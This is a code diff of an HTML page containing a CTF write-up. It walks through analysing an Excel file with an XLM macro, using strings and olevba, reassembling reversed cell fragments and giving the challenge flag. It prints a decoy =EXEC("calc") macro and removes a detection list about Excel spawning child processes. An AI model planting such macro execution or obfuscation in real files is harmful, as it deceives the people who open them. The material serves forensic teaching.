-            <p data-i18n="writeup_re02_intro">Excel document with XLM macro containing hint about hidden flag across
-                cells B128, D70, E178.</p>
-            <img src="assets/img/vcspassport2024/image7.png" alt="Excel document">
+            <!-- Phase 1: Initial Specimen Examination -->
+            <h4 data-i18n="writeup_re02_h_phase1">🔍 Phase 1: Initial Specimen Examination</h4>
+            <p data-i18n="writeup_re02_phase1">The challenge provides a single artifact: <code>RE02.xls</code> — an
+                older Excel binary format with embedded macros. Opening in Protected View reveals a hint:
+                <em>"Tìm đoạn macro chạy calc, bạn sẽ thấy flag"</em> (Find the macro that runs calc, you'll find
+                the flag).</p>
+            <img src="assets/img/vcspassport2024/image7.png"
+                alt="Excel Protected View — RE02.xls with challenge hint">
 
-            <p data-i18n="writeup_re02_analysis">Strings output showed obfuscation pattern but contained erroneous
-                characters.</p>
-            <img src="assets/img/vcspassport2024/image8.png" alt="Strings output">
+            <!-- Phase 2: Static String Extraction -->
+            <h4 data-i18n="writeup_re02_h_phase2">🔍 Phase 2: Static String Extraction</h4>
+            <p data-i18n="writeup_re02_phase2">Running <code>strings</code> against the binary reveals key artifacts:
+                <code>Flag in J123</code>, the assembly instruction
+                <code>reverse string in B128 + D70 + reverse string in E178</code>, cell fragments <code>{SCV</code>,
+                <code>MY_SUPERPOWER5</code>, and <code>}HCIR_SI_</code>.</p>
+            <img src="assets/img/vcspassport2024/image8.png"
+                alt="Kali terminal — strings output highlighting flag construction artifacts">
 
-            <h4>💡 The Breakthrough</h4>
-            <p data-i18n="writeup_re02_breakthrough"><code>olevba</code> properly deobfuscated the macro, revealing
-                actual cell values witout erroneous characters.</p>
-            <img src="assets/img/vcspassport2024/image9.png" alt="olevba analysis">
+            <!-- Phase 3: False Lead -->
+            <h4 data-i18n="writeup_re02_h_phase3">🔍 Phase 3: Manual Reconstruction (False Lead)</h4>
+            <p data-i18n="writeup_re02_phase3">Initial reconstruction based on strings output:</p>
+            <ul>
+                <li><strong>B128:</strong> <code>{SCV</code> → reversed → <code>VCS{</code></li>
+                <li><strong>D70:</strong> <code>MY_SUPERPOWER5</code></li>
+                <li><strong>E178:</strong> <code>}HCIR_SI_</code> → reversed → <code>_IS_RICH}</code></li>
+            </ul>
+            <p data-i18n="writeup_re02_phase3b">Assembled result: <code>VCS{MY_SUPERPOWER5_IS_RICH}</code> — but this
+                was <strong>rejected</strong>. The <code>5</code> is a red herring from raw binary extraction, where
+                <code>strings</code> does not respect OLE document boundaries.</p>
 
-            <pre><code class="language-bash"># olevba command
-olevba RE02.xls
+            <!-- Phase 4: The Breakthrough -->
+            <h4 data-i18n="writeup_re02_h_phase4">💡 Phase 4: OLE Macro Analysis — The Breakthrough</h4>
+            <p data-i18n="writeup_re02_phase4">The specialized tool <code>olevba</code> (oletools suite) properly
+                parses and deobfuscates the XLM macro, revealing the actual cell values:</p>
+            <img src="assets/img/vcspassport2024/image9.png"
+                alt="PowerShell — olevba output with full XLM macro deobfuscation">
 
-# Key findings:
-# B128 reversed: VCS{
-# D70: MY_SUPERPOWER
-# E178 reversed: _IS_RICH}</code></pre>
+            <pre><code class="language-bash">' RAW EXCEL4/XLM MACRO FORMULAS:
+' SHEET: HaiNH45, Macrosheet
+' CELL:K3, =HALT(), 1
+' CELL:K2, =EXEC("calc"), 33.0
+' CELL:J123, None, reverse string in B128 + D70 + reverse string in E178
+' CELL:E178, None, }HCIR_SI_
+' CELL:D70, None, MY_SUPERPOWER
+' CELL:B128, None, {SCV</code></pre>
 
+            <p data-i18n="writeup_re02_phase4b">The critical difference: <strong>Cell D70 contains
+                    <code>MY_SUPERPOWER</code> — without the <code>5</code></strong>. Correct reconstruction:</p>
+            <ul>
+                <li><strong>B128</strong> reversed → <code>VCS{</code></li>
+                <li><strong>D70:</strong> <code>MY_SUPERPOWER</code></li>
+                <li><strong>E178</strong> reversed → <code>_IS_RICH}</code></li>
+            </ul>
+
+            <!-- Key Takeaways -->
             <div class="writeup-detection">
-                <h4>🛡️ Detection Strategy (Blue Team)</h4>
+                <h4 data-i18n="writeup_re02_h_takeaways">📊 Key Forensic Takeaways</h4>
                 <ul>
-                    <li>Alert on Excel files containing XLM macro sheets</li>
-                    <li>Monitor for <code>EXEC</code> function calls in spreadsheets</li>
-                    <li>Detect Excel spawning child processes (calc.exe, cmd.exe)</li>
-                    <li>Flag <code>xlm_macro</code> OLE streams in documents</li>
+                    <li data-i18n="writeup_re02_takeaway1"><strong>XLM ≠ VBA:</strong> Excel 4.0 macros use a different
+                        storage format — specialized tools like <code>olevba</code> are required</li>
+                    <li data-i18n="writeup_re02_takeaway2"><strong><code>strings</code> can mislead:</strong> Raw binary
+                        extraction doesn't respect OLE boundaries — the <code>5</code> was a binary artifact</li>
+                    <li data-i18n="writeup_re02_takeaway3"><strong>Decoy execution:</strong>
+                        <code>=EXEC("calc")</code> distracts the analyst from the obfuscated flag</li>
+                    <li data-i18n="writeup_re02_takeaway4"><strong>Cell fragmentation:</strong> Splitting and reversing
+                        strings across scattered cells is an effective obfuscation technique</li>
                 </ul>
             </div>
 
-            <blockquote><strong>Flag:</strong> VCS{MY_SUPERPOWER_IS_RICH}</blockquote>
+            <blockquote><strong>Flag:</strong> <code>VCS{MY_SUPERPOWER_IS_RICH}</code></blockquote>
         </div>
     </template>
 
